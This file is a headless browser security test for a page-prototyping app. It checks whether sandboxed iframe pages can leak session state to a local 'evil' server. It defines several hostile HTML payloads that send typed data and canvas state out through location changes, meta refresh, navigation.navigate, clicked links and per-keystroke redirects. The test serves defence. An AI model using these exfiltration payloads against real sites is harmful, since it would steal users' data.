// Headless check that a prototype page cannot leak data by navigating its own frame.
//
//   node scripts/page-leak.mjs [--mode srcdoc]       default: pages are srcdoc frames, no sandbox server
//   node scripts/page-leak.mjs --mode strict         start the sandbox server too: pages on sandbox origins
//   node scripts/page-leak.mjs --app http://localhost:5291 [--expect leak]
//                                                    test an app that is already running (an older checkout)
//
// A throwaway "evil" server on 127.0.0.1 records every request. Evil pages try to send the session
// state (a name typed into another page) to it: `location = …`, a meta refresh, `navigation.navigate`,
// a clicked link. Four vectors:
//   idle      the four pages above as idle thumbnails (no click), state "Ada Secret" set elsewhere
//   typed     an interactive page that navigates on every keystroke
//   play      a page reached in Play, after the name was typed in Play, that reads canvas.state
// Expected, by mode (the idle row follows IDLE_THUMBNAIL_SCRIPTS in src/sandbox/srcdoc.ts, read off the
// frames' sandbox attribute):
//   strict                         0 requests everywhere (the frame host cancels every navigation)
//   srcdoc, idle scripts off       idle: 0 requests, pages still render; typed, play: <= 1 request, then the frame is removed
//   srcdoc, idle scripts on        idle: <= 1 request per page, carrying NO state, then the frame is removed;
//                                  typed, play: <= 1 request, then the frame is removed
// In srcdoc mode Esc still closes Play after the frame was removed. Exit code 1 on a difference.

import http from 'node:http';
import net from 'node:net';
import { spawn } from 'node:child_process';
import { chromium } from 'playwright-core';

const args = process.argv.slice(2);
const opt = (name, dflt) => (args.includes(name) ? args[args.indexOf(name) + 1] : dflt);
const expect = opt('--expect', 'blocked');
const mode = opt('--mode', 'srcdoc');
if (!['srcdoc', 'strict'].includes(mode)) throw new Error('--mode is srcdoc or strict');
const freePort = () => new Promise((r) => { const s = net.createServer().listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });

// ---- the evil server
const hits = [];
const evilPort = Number(opt('--evil-port', 0)) || (await freePort());
http
  .createServer((req, res) => {
    hits.push(req.url);
    res.writeHead(200, { 'content-type': 'text/html' });
    res.end('<h1 style="color:red">EVIL SITE</h1>');
  })
  .listen(evilPort, '127.0.0.1');
const EVIL = `http://127.0.0.1:${evilPort}`;

// ---- the app (ours, or one already running)
let appUrl = opt('--app');
const stops = [];
if (!appUrl) {
  delete process.env.VITE_SANDBOX_URL;
  delete process.env.VITE_SANDBOX_PORT;
  if (mode === 'strict') {
    const sbx = Number(opt('--sandbox-port', 0)) || (await freePort());
    const srv = spawn(process.execPath, ['sandbox/server.mjs', '--port', String(sbx)], { stdio: ['ignore', 'pipe', 'inherit'] });
    stops.push(() => srv.kill());
    await new Promise((r) => srv.stdout.once('data', r));
    process.env.VITE_SANDBOX_URL = `http://{label}.localhost:${sbx}`;
  }
  const { createServer } = await import('vite');
  const vite = await createServer({ server: { port: Number(opt('--app-port', 0)), host: '127.0.0.1' }, logLevel: 'error' });
  await vite.listen();
  stops.push(() => vite.close());
  appUrl = `http://localhost:${vite.httpServer.address().port}`;
}

const state = `JSON.stringify(canvas.state)`;
const evil = {
  location: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/location?s=' + encodeURIComponent(${state});</script>`,
  meta: `<h1>Innocent</h1><script>const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${EVIL}/meta?s=' + encodeURIComponent(${state}); document.head.append(m);</script>`,
  navigation: `<h1>Innocent</h1><script>navigation.navigate(${JSON.stringify(EVIL)} + '/navigation?s=' + encodeURIComponent(${state}));</script>`,
  link: `<h1>Innocent</h1><script>const a = document.createElement('a'); a.href = ${JSON.stringify(EVIL)} + '/link?s=' + encodeURIComponent(${state}); document.body.append(a); a.click();</script>`,
  play: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/play?s=' + encodeURIComponent(${state});</script>`,
  typed: `<input id="i" placeholder="type here"><script>i.oninput = () => { location.href = ${JSON.stringify(EVIL)} + '/typed?v=' + encodeURIComponent(i.value); };</script>`,
};

const browser = await chromium.launch({ channel: 'chrome', headless: true });
let code = 0;
try {
  const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
  const errors = [];
  page.on('pageerror', (e) => errors.push(String(e)));
  await page.goto(appUrl);
  await page.waitForFunction(() => window.app?.dispatch, null, { timeout: 30_000 });
  await page.evaluate(() => {
    app.store.load({ nodes: [], edges: [] });
    app.dispatch('page.seed', { x: 0, y: 0 });
  });
  const seeded = await page.evaluate(() => app.doc.nodes.map((n) => [n.id, n['x-page']?.title]).filter((x) => x[1]));
  const signup = seeded.find((x) => x[1] === 'Sign up')?.[0];
  if (!signup) throw new Error('seed has no Sign up page');

  // put "Ada" into the session state the way a person would: interact with the Sign up page and type
  await page.evaluate(() => app.view.fit());
  const box = page.locator(`[data-node-id="${signup}"]`);
  await box.locator('[data-action="live"]').click();
  const form = box.frameLocator('iframe');
  await form.locator('[data-store="name"]').fill('Ada Secret');
  await page.waitForTimeout(300);

  // which flavour do idle thumbnails have? (read off a frame before any evil page exists)
  const idleSandbox = await page.evaluate(() => document.querySelector('iframe.pg-frame')?.getAttribute('sandbox') ?? null);
  const idleScripts = mode === 'strict' ? true : idleSandbox !== '';
  console.log(`mode ${mode}; idle thumbnails: sandbox="${idleSandbox}" (${mode === 'strict' ? 'scripts on, navigation guard' : idleScripts ? 'scripts ON, no state' : 'scripts OFF'})`);

  // the evil pages, as idle thumbnails
  const idleKeys = ['location', 'meta', 'navigation', 'link', 'typed'];
  await page.evaluate(({ evil, idleKeys }) => {
    let i = 0;
    for (const k of idleKeys) app.dispatch('page.create', { x: 1800 + (i++) * 260, y: 0, title: 'Evil ' + k, html: evil[k] });
  }, { evil, idleKeys });
  await page.waitForTimeout(3000);
  const idle = [...hits];

  // typing into an interactive evil page
  const idOf = (k) => page.evaluate((k) => app.doc.nodes.find((n) => n['x-page']?.title === 'Evil ' + k).id, k);
  const typedId = await idOf('typed');
  await page.evaluate((id) => { app.store.select([id]); app.view.fit(60, app.doc.nodes.filter((n) => n.id === id)); }, typedId);
  const t = page.locator(`[data-node-id="${typedId}"]`);
  await t.locator('[data-action="live"]').click();
  await t.frameLocator('iframe').locator('#i').pressSequentially('hunter2', { delay: 60 }).catch(() => {}); // the frame may be removed under us
  await page.waitForTimeout(1500);

  // control: the pages really rendered and stayed put (blocked is not "never loaded"), or were removed
  const intact = [];
  let removed = 0;
  for (const k of ['location', 'meta', 'navigation', 'link']) {
    const id = await idOf(k);
    const text = await page.locator(`[data-node-id="${id}"] iframe`).contentFrame().locator('h1').textContent({ timeout: 1500 }).catch(() => null);
    if (text === 'Innocent') intact.push(k);
    if (await page.locator(`[data-node-id="${id}"] .pg-gone`).count()) removed++;
  }
  const typedValue = await t.frameLocator('iframe').locator('#i').inputValue({ timeout: 1500 }).catch(() => null);
  const typedGone = (await t.locator('.pg-gone').count()) > 0;
  const beforePlay = hits.length;

  // Play: name typed in Play, then a page that reads canvas.state and leaves
  const signupId = signup;
  const playId = await page.evaluate(({ html, signupId }) => {
    app.dispatch('page.create', { x: 1800, y: 600, title: 'Evil play', html });
    const id = app.doc.nodes.find((n) => n['x-page']?.title === 'Evil play').id;
    app.dispatch('page.link', { from: signupId, to: id, label: 'Evil' });
    app.prototype.player.start(signupId);
    return id;
  }, { html: evil.play, signupId });
  const dev = page.locator('.pg-device');
  await dev.frameLocator('iframe').locator('[data-store="name"]').fill('Ada Secret');
  await page.waitForTimeout(300);
  await page.locator('.pg-chip', { hasText: 'Evil' }).click();
  await page.waitForTimeout(2500);
  const playGone = (await dev.locator('.pg-gone').count()) > 0;
  const playStill = await dev.frameLocator('iframe').locator('h1').textContent({ timeout: 1000 }).catch(() => null);
  await page.keyboard.press('Escape');
  await page.waitForTimeout(300);
  const playClosed = !(await page.evaluate(() => app.prototype.player.isOpen));

  const leaked = (name) => hits.filter((h) => h.startsWith('/' + name));
  const stateOf = (h) => decodeURIComponent(h.split('?s=')[1] ?? '');
  // the Play page also sits on the canvas as an idle thumbnail (that request has no state); the Play one carries the name
  const playHits = leaked('play').filter((h) => !h.startsWith('/play?s=%7B%7D') && stateOf(h) !== '{}');
  const rows = [...idleKeys, 'play'].map((k) => [k, k === 'play' ? playHits : leaked(k)]);
  console.log(`idle: pages still showing their own content ${intact.length}/4, frames removed ${removed}/4`);
  console.log(`typed: interactive input holds "${typedValue}", frame removed: ${typedGone}`);
  console.log(`play: frame removed: ${playGone}, page still showing: ${playStill}, Esc closed Play: ${playClosed}`);
  for (const [k, l] of rows) console.log(`${k.padEnd(11)} ${l.length ? `${l.length} request(s)  ` + decodeURIComponent(l[0]).slice(0, 90) : 'blocked'}`);
  console.log(`idle thumbnails: ${idle.length} request(s) to the evil server; after typing: ${beforePlay}; after Play: ${hits.length}`);
  if (errors.length) console.log('page errors:', errors.join(' | '));
  const idleOf = (k) => leaked(k);
  const checks = [];
  const check = (name, v) => checks.push([name, !!v]);
  if (expect === 'leak') {
    check('old app leaks from idle thumbnails', hits.length > 0 && idle.length > 0);
  } else if (mode === 'strict') {
    check('no request at all', hits.length === 0);
    check('idle pages render', intact.length === 4);
    check('interactive input keeps typing', typedValue === 'hunter2');
    check('Play page stays and Esc closes Play', playStill === 'Innocent' && playClosed);
  } else if (!idleScripts) {
    check('idle: 0 requests', idle.length === 0);
    check('idle pages render (no scripts)', intact.length === 4);
    check('typed: <= 1 request, frame removed', leaked('typed').length <= 1 && typedGone);
    check('play: <= 1 request, frame removed', playHits.length <= 1 && playGone);
    check('Esc closes Play', playClosed);
    check('play: the vector is live (its request, if any, is the accepted one with the Play state)', playHits.every((h) => stateOf(h).includes('Ada Secret')));
  } else {
    check('idle: <= 1 request per page', idleKeys.every((k) => idleOf(k).length <= 1));
    check('idle: no request carries state', idle.every((h) => !h.includes('Ada') && (h.startsWith('/typed') || stateOf(h) === '{}')));
    check('idle: frames removed after the request', removed === 4 - intact.length && removed + intact.length === 4 && (idleOf('location').length === 0 || removed > 0));
    check('typed: <= 1 request, frame removed', leaked('typed').length <= 1 && typedGone);
    check('play: <= 1 request, frame removed', playHits.length <= 1 && playGone);
    check('Esc closes Play', playClosed);
    check('play: the vector is live (its request is the accepted one with the Play state)', playHits.length === 1 && stateOf(playHits[0]).includes('Ada Secret'));
  }
  for (const [n, v] of checks) console.log(`${v ? 'ok  ' : 'FAIL'} ${n}`);
  const ok = checks.every(([, v]) => v);
  console.log(ok ? `OK (${mode}${expect === 'leak' ? ', expected leak' : ''})` : `FAIL (${mode})`);
  if (!ok) code = 1;
} catch (e) {
  console.error(e);
  code = 1;
} finally {
  await browser.close();
  for (const s of stops) await s();
  setTimeout(() => process.exit(code), 100);
}
